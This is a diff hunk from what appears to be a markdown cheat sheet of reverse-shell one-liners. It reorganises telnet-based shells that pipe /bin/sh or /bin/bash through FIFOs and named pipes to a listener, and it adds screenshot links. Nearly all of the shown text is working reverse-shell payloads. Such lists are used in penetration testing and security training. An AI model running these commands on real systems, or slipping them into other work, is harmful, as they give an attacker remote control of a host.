@@ -68,10 +68,17 @@ telnet 127.0.0.1 1234 | /bin/sh #Blind
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 127.0.0.1 1234 >/tmp/f
 
-telnet 127.0.0.1 1234 | /bin/bash | telnet 127.0.0.1 12345
-
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet 127.0.0.1 1234 1>/tmp/bkpipe
 ```
+![agent](../images/WechatIMG59.jpeg)
+![agent](../images/WechatIMG60.jpeg)
+
+
+```bash
+telnet 127.0.0.1 1234 | /bin/bash | telnet 127.0.0.1 12345
+```
+
+![agent](../images/WechatIMG61.jpeg)
 
 
 ```perl
